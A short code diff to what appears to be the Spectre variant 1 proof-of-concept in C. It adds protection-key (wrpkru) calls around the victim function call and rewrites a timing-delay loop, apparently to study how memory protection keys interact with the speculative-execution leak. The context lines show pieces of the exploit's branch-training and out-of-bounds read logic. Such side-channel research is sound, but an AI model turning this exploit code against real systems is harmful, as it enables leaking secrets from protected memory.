@@ -22,6 +22,7 @@
 #include <errno.h>
 #include <string.h>
 
+#include "pkeys.h"
 
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtsc, rdtscp, clflush */
@@ -176,7 +177,8 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 #endif
 
       /* Delay (can also mfence) */
-      for (volatile int z = 0; z < 100; z++) {}
+      volatile int z = 0;
+      for (z = 0; z < 100; z++) {}
 
       /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
       /* Avoid jumps in case those tip off the branch predictor */
@@ -185,7 +187,9 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       x = training_x ^ (x & (malicious_x ^ training_x));
 
       /* Call the victim! */
+      __wrpkru((0x55555550));
       victim_function(x);
+      __wrpkru((0x5555555C));
 
     }
 
